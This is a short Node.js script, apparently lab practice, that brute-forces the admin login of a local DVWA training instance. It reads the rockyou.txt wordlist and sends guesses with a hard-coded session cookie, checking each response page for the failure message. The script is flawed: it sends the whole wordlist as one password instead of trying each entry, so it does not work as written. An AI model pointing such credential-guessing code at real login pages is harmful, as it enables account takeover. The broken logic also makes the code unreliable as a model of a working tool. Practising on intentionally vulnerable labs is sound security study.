const axios = require('axios');
const colors = require('colors');
const fs = require('fs');
const cheerio = require('cheerio');

let url = "http://localhost:8080/DVWA-master/vulnerabilities/brute/?username=admin&password=%s&Login=Login#";
const options = {
    headers: {
      "Cookie": "security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e",
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
},
}

   
fs.readFile('../../rockyou.txt', 'utf8', (err, password) => {
    axios.get(url.replace('%s', (password +"\n")), options,).then((res) => {
        console.log(url)
        const $ = cheerio.load(res.data);
        var data = cheerio.html($('pre'))
        console.log(url)
        if (data != '<pre><br>Username and/or password incorrect.</pre>') {
            console.log(password)
            
        }
    })
    })
